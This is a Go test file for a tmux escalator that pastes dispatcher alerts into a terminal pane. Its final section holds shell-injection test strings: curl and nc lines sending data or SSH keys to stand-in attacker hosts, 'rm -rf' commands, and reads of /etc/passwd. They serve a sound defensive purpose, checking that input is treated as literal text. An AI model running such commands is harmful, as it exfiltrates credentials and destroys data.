package dispatcher_test

import (
	"context"
	"fmt"
	"strings"
	"sync"
	"testing"

	"oro/pkg/dispatcher"
	"oro/pkg/protocol"
)

// mockEscRunner captures commands for assertion without running real tmux.
type mockEscRunner struct {
	calls         []escCall
	err           error
	hasSessionErr error // separate error for has-session check
}

type escCall struct {
	name string
	args []string
}

func (m *mockEscRunner) Run(_ context.Context, name string, args ...string) ([]byte, error) {
	m.calls = append(m.calls, escCall{name: name, args: args})

	// If this is a has-session check, return hasSessionErr (defaults to nil)
	if name == "tmux" && len(args) > 0 && args[0] == "has-session" {
		return nil, m.hasSessionErr
	}

	// Otherwise return the general err
	return nil, m.err
}

// --- Tests ---

func TestEscalator_ClearsInputBeforePaste(t *testing.T) {
	runner := &mockEscRunner{}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	err := esc.Escalate(context.Background(), "test message")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should now be 5 calls: has-session, send-keys C-u, set-buffer, paste-buffer, send-keys Enter
	if len(runner.calls) != 5 {
		t.Fatalf("expected 5 calls (has-session + C-u + set-buffer + paste-buffer + Enter), got %d", len(runner.calls))
	}

	// Call 1 (index 1): send-keys C-u
	cuCall := runner.calls[1]
	if cuCall.args[0] != "send-keys" {
		t.Errorf("call 1 should be send-keys, got: %s", cuCall.args[0])
	}
	if cuCall.args[len(cuCall.args)-1] != "C-u" {
		t.Errorf("call 1 should send C-u, got: %v", cuCall.args)
	}

	// Call 2 (index 2): set-buffer (comes AFTER C-u)
	setCall := runner.calls[2]
	if setCall.args[0] != "set-buffer" {
		t.Errorf("call 2 should be set-buffer, got: %s", setCall.args[0])
	}
}

func TestTmuxEscalator_Escalate_BasicMessage(t *testing.T) {
	runner := &mockEscRunner{}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	err := esc.Escalate(context.Background(), "merge failed for bead abc123")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// 5 calls: has-session, send-keys C-u, set-buffer, paste-buffer, send-keys Enter
	if len(runner.calls) != 5 {
		t.Fatalf("expected 5 calls (has-session + C-u + set-buffer + paste-buffer + send-keys), got %d", len(runner.calls))
	}

	// First call: has-session
	call0 := runner.calls[0]
	if call0.args[0] != "has-session" {
		t.Fatalf("expected has-session, got %s", call0.args[0])
	}

	// Second call: send-keys C-u
	cuCall := runner.calls[1]
	if cuCall.args[0] != "send-keys" {
		t.Fatalf("expected send-keys (C-u), got %s", cuCall.args[0])
	}
	if cuCall.args[len(cuCall.args)-1] != "C-u" {
		t.Fatalf("expected C-u as last arg, got %s", cuCall.args[len(cuCall.args)-1])
	}

	// Third call: set-buffer
	setBufferCall := runner.calls[2]
	if setBufferCall.args[0] != "set-buffer" {
		t.Fatalf("expected set-buffer, got %s", setBufferCall.args[0])
	}
	if !strings.Contains(strings.Join(setBufferCall.args, " "), "merge failed for bead abc123") {
		t.Fatalf("message not found in set-buffer call: %v", setBufferCall.args)
	}

	// Fourth call: paste-buffer
	pasteCall := runner.calls[3]
	if pasteCall.args[0] != "paste-buffer" {
		t.Fatalf("expected paste-buffer, got %s", pasteCall.args[0])
	}

	// Fifth call: send-keys Enter
	enterCall := runner.calls[4]
	if enterCall.args[0] != "send-keys" {
		t.Fatalf("expected send-keys, got %s", enterCall.args[0])
	}
	if enterCall.args[len(enterCall.args)-1] != "Enter" {
		t.Fatalf("expected Enter as last arg, got %s", enterCall.args[len(enterCall.args)-1])
	}
}

func TestTmuxEscalator_Escalate_Error(t *testing.T) {
	// Simulate send-keys error (session exists but send-keys fails)
	runner := &mockEscRunner{err: fmt.Errorf("tmux not running")}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	err := esc.Escalate(context.Background(), "test")
	if err == nil {
		t.Fatal("expected error")
	}
	if !strings.Contains(err.Error(), "tmux") {
		t.Fatalf("error should mention tmux, got: %v", err)
	}
}

func TestTmuxEscalator_DefaultSessionAndPane(t *testing.T) {
	runner := &mockEscRunner{}
	esc := dispatcher.NewTmuxEscalator("", "", runner)

	err := esc.Escalate(context.Background(), "hello")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if len(runner.calls) != 5 {
		t.Fatalf("expected 5 calls, got %d", len(runner.calls))
	}

	// First call: has-session with default session name
	call0 := runner.calls[0]
	if call0.args[0] != "has-session" {
		t.Fatalf("expected has-session, got %s", call0.args[0])
	}
	if call0.args[2] != "oro" {
		t.Fatalf("expected default session oro, got %s", call0.args[2])
	}

	// Check paste-buffer call for default window target (now index 3)
	pasteCall := runner.calls[3]
	foundPane := false
	for i, arg := range pasteCall.args {
		if arg == "-t" && i+1 < len(pasteCall.args) {
			if pasteCall.args[i+1] == "oro:manager" {
				foundPane = true
				break
			}
		}
	}
	if !foundPane {
		t.Fatalf("expected default window oro:manager in paste-buffer call, got args: %v", pasteCall.args)
	}
}

func TestTmuxEscalator_SanitizesNewlines(t *testing.T) {
	runner := &mockEscRunner{}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	err := esc.Escalate(context.Background(), "line1\nline2\rline3")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Check set-buffer call (third call, after has-session and C-u)
	setBufferCall := runner.calls[2]
	msg := setBufferCall.args[len(setBufferCall.args)-1]
	if strings.Contains(msg, "\n") || strings.Contains(msg, "\r") {
		t.Fatalf("message should not contain newlines, got %q", msg)
	}
}

func TestTmuxEscalator_EnterSuffix(t *testing.T) {
	runner := &mockEscRunner{}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	_ = esc.Escalate(context.Background(), "test")

	// The fifth call should be send-keys with Enter
	if len(runner.calls) < 5 {
		t.Fatalf("expected at least 5 calls, got %d", len(runner.calls))
	}
	enterCall := runner.calls[4]
	lastArg := enterCall.args[len(enterCall.args)-1]
	if lastArg != "Enter" {
		t.Fatalf("last arg should be Enter, got %s", lastArg)
	}
}

func TestTmuxEscalator_ImplementsInterface(t *testing.T) {
	runner := &mockEscRunner{}
	var _ dispatcher.Escalator = dispatcher.NewTmuxEscalator("", "", runner)
}

func TestTmuxEscalator_CustomPaneTarget(t *testing.T) {
	runner := &mockEscRunner{}
	esc := dispatcher.NewTmuxEscalator("myapp", "myapp:1.2", runner)

	_ = esc.Escalate(context.Background(), "custom pane")

	if len(runner.calls) != 5 {
		t.Fatalf("expected 5 calls, got %d", len(runner.calls))
	}

	// Check has-session call (first call)
	call0 := runner.calls[0]
	if call0.args[2] != "myapp" {
		t.Fatalf("expected custom session myapp, got %s", call0.args[2])
	}

	// Check paste-buffer call for pane target (now index 3)
	pasteCall := runner.calls[3]
	foundPane := false
	for i, arg := range pasteCall.args {
		if arg == "-t" && i+1 < len(pasteCall.args) {
			if pasteCall.args[i+1] == "myapp:1.2" {
				foundPane = true
				break
			}
		}
	}
	if !foundPane {
		t.Fatalf("expected custom pane myapp:1.2 in paste-buffer call, got args: %v", pasteCall.args)
	}
}

// threadSafeEscRunner is a concurrency-safe mock that records call sequences per goroutine.
type threadSafeEscRunner struct {
	mu    sync.Mutex
	calls []escCall
}

func (m *threadSafeEscRunner) Run(_ context.Context, name string, args ...string) ([]byte, error) {
	m.mu.Lock()
	m.calls = append(m.calls, escCall{name: name, args: args})
	m.mu.Unlock()
	return nil, nil
}

func TestTmuxEscalator_ConcurrentEscalateSerializes(t *testing.T) {
	runner := &threadSafeEscRunner{}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	const n = 20
	var wg sync.WaitGroup
	wg.Add(n)
	for i := range n {
		go func(i int) {
			defer wg.Done()
			_ = esc.Escalate(context.Background(), fmt.Sprintf("msg-%d", i))
		}(i)
	}
	wg.Wait()

	// Each Escalate call produces exactly 5 tmux calls:
	// has-session, send-keys C-u, set-buffer, paste-buffer, send-keys Enter.
	// With mutex serialization, calls must appear in groups of 5.
	runner.mu.Lock()
	calls := runner.calls
	runner.mu.Unlock()

	if len(calls) != n*5 {
		t.Fatalf("expected %d calls (%d escalations × 5), got %d", n*5, n, len(calls))
	}

	// Verify calls appear in correct 5-call groups (no interleaving).
	for i := 0; i < len(calls); i += 5 {
		group := calls[i : i+5]
		if group[0].args[0] != "has-session" {
			t.Errorf("call %d: expected has-session, got %s", i, group[0].args[0])
		}
		if group[1].args[0] != "send-keys" {
			t.Errorf("call %d: expected send-keys (C-u), got %s", i+1, group[1].args[0])
		}
		if group[2].args[0] != "set-buffer" {
			t.Errorf("call %d: expected set-buffer, got %s", i+2, group[2].args[0])
		}
		if group[3].args[0] != "paste-buffer" {
			t.Errorf("call %d: expected paste-buffer, got %s", i+3, group[3].args[0])
		}
		if group[4].args[0] != "send-keys" {
			t.Errorf("call %d: expected send-keys (Enter), got %s", i+4, group[4].args[0])
		}

		// The buffer name in set-buffer and paste-buffer must match within the group.
		setBuf := strings.Join(group[2].args, " ")
		pasteBuf := strings.Join(group[3].args, " ")
		if !strings.Contains(setBuf, "oro-escalate") || !strings.Contains(pasteBuf, "oro-escalate") {
			t.Errorf("group %d: buffer name mismatch, set=%s paste=%s", i/5, setBuf, pasteBuf)
		}
	}
}

// --- FormatEscalation tests ---

func TestFormatEscalation_WithDetails(t *testing.T) {
	got := protocol.FormatEscalation(protocol.EscMergeConflict, "bead-abc", "merge failed", "conflicting files in src/")
	want := "[ORO-DISPATCH] MERGE_CONFLICT: bead-abc — merge failed. conflicting files in src/."
	if got != want {
		t.Fatalf("FormatEscalation with details:\n got: %q\nwant: %q", got, want)
	}
}

func TestFormatEscalation_WithoutDetails(t *testing.T) {
	got := protocol.FormatEscalation(protocol.EscStuck, "bead-xyz", "review failed", "")
	want := "[ORO-DISPATCH] STUCK: bead-xyz — review failed."
	if got != want {
		t.Fatalf("FormatEscalation without details:\n got: %q\nwant: %q", got, want)
	}
}

func TestFormatEscalation_AllTypes(t *testing.T) {
	types := []struct {
		typ  protocol.EscalationType
		name string
	}{
		{protocol.EscMergeConflict, "MERGE_CONFLICT"},
		{protocol.EscStuck, "STUCK"},
		{protocol.EscPriorityContention, "PRIORITY_CONTENTION"},
		{protocol.EscWorkerCrash, "WORKER_CRASH"},
		{protocol.EscStatus, "STATUS"},
		{protocol.EscDrainComplete, "DRAIN_COMPLETE"},
	}

	for _, tc := range types {
		t.Run(tc.name, func(t *testing.T) {
			got := protocol.FormatEscalation(tc.typ, "bead-1", "summary", "")
			prefix := "[ORO-DISPATCH] " + tc.name + ": bead-1"
			if !strings.HasPrefix(got, prefix) {
				t.Fatalf("expected prefix %q, got %q", prefix, got)
			}
		})
	}
}

func TestFormatEscalation_EmptyBeadID(t *testing.T) {
	got := protocol.FormatEscalation(protocol.EscDrainComplete, "", "all workers drained", "")
	want := "[ORO-DISPATCH] DRAIN_COMPLETE:  — all workers drained."
	if got != want {
		t.Fatalf("FormatEscalation empty bead:\n got: %q\nwant: %q", got, want)
	}
}

func TestEscalation_DeadSession(t *testing.T) {
	// Simulate a dead tmux session: has-session returns error
	runner := &mockEscRunner{hasSessionErr: fmt.Errorf("session not found")}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	err := esc.Escalate(context.Background(), "test escalation")
	if err == nil {
		t.Fatal("expected error when tmux session is dead")
	}

	if !strings.Contains(err.Error(), "session oro not found") {
		t.Fatalf("error should mention session not found, got: %v", err)
	}

	// Verify has-session was called but nothing else
	if len(runner.calls) != 1 {
		t.Fatalf("expected 1 call (has-session only), got %d", len(runner.calls))
	}

	call := runner.calls[0]
	if call.args[0] != "has-session" {
		t.Fatalf("expected has-session, got %s", call.args[0])
	}
	if call.args[2] != "oro" {
		t.Fatalf("expected session name 'oro', got %s", call.args[2])
	}
}

// --- Shell Injection Tests (oro-dfe.4) ---

func TestEscalation_NoInjection(t *testing.T) {
	tests := []struct {
		name    string
		message string
		desc    string
	}{
		{name: "command substitution dollar-paren", message: "QG output: $(rm -rf /)", desc: "$(rm -rf /) should be treated as literal text"},
		{name: "command substitution backticks", message: "protocol.Bead title: `whoami`", desc: "backticks should be treated as literal text"},
		{name: "pipe chain", message: "Error | nc attacker.com 1234", desc: "pipe operator should not execute commands"},
		{name: "semicolon chain", message: "Done; curl evil.com/exfil", desc: "semicolon should not chain commands"},
		{name: "ampersand background", message: "Wait & curl evil.com", desc: "ampersand should not background commands"},
		{name: "double ampersand", message: "Success && rm -rf .", desc: "double ampersand should not chain commands"},
		{name: "redirect output", message: "Log > /tmp/leak", desc: "redirect operators should not create files"},
		{name: "redirect input", message: "Read < /etc/passwd", desc: "redirect operators should not read files"},
		{name: "variable expansion", message: "Path: $HOME/.ssh/id_rsa", desc: "variables should not be expanded"},
		{name: "glob expansion", message: "Files: *", desc: "glob patterns should not be expanded"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			runner := &mockEscRunner{}
			esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

			err := esc.Escalate(context.Background(), tt.message)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}

			// 5 calls: has-session, send-keys C-u, set-buffer, paste-buffer, send-keys Enter
			if len(runner.calls) != 5 {
				t.Fatalf("expected 5 calls (has-session + C-u + set-buffer + paste-buffer + send-keys), got %d", len(runner.calls))
			}

			// Verify set-buffer is used (third call, after has-session and C-u)
			setBufferCall := runner.calls[2]
			if setBufferCall.args[0] != "set-buffer" {
				t.Errorf("SECURITY: Not using set-buffer for literal text. Got %s. %s", setBufferCall.args[0], tt.desc)
			}

			// Verify paste-buffer is used (fourth call)
			pasteCall := runner.calls[3]
			if pasteCall.args[0] != "paste-buffer" {
				t.Errorf("SECURITY: Not using paste-buffer for literal insertion. Got %s. %s", pasteCall.args[0], tt.desc)
			}

			// Verify send-keys is only used for Enter (fifth call)
			enterCall := runner.calls[4]
			if enterCall.args[0] == "send-keys" {
				for _, arg := range enterCall.args {
					if strings.Contains(arg, "$") || strings.Contains(arg, "`") || strings.Contains(arg, ";") {
						t.Errorf("SECURITY: send-keys contains dangerous characters: %s. %s", arg, tt.desc)
					}
				}
			}
		})
	}
}

func TestEscalation_ComplexPayload(t *testing.T) {
	runner := &mockEscRunner{}
	esc := dispatcher.NewTmuxEscalator("oro", "oro:manager", runner)

	payload := "[ORO-DISPATCH] STUCK: bead-$(whoami) — Review failed; curl attacker.com?data=$(cat ~/.ssh/id_rsa | base64). `rm -rf /tmp/*`"

	err := esc.Escalate(context.Background(), payload)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if len(runner.calls) != 5 {
		t.Fatalf("expected 5 calls, got %d", len(runner.calls))
	}

	// Third call should be set-buffer with the payload (after has-session and C-u)
	setBufferCall := runner.calls[2]
	if setBufferCall.args[0] != "set-buffer" {
		t.Error("SECURITY: Expected set-buffer for literal text handling")
	}

	// Fourth call should be paste-buffer
	pasteCall := runner.calls[3]
	if pasteCall.args[0] != "paste-buffer" {
		t.Error("SECURITY: Expected paste-buffer for literal insertion")
	}

	// Fifth call should be send-keys with only Enter
	enterCall := runner.calls[4]
	if enterCall.args[0] == "send-keys" {
		argsStr := strings.Join(enterCall.args, " ")
		if strings.Contains(argsStr, "$(") || strings.Contains(argsStr, "`") {
			t.Error("SECURITY: send-keys contains dangerous payload - should only send Enter")
		}
	}
}
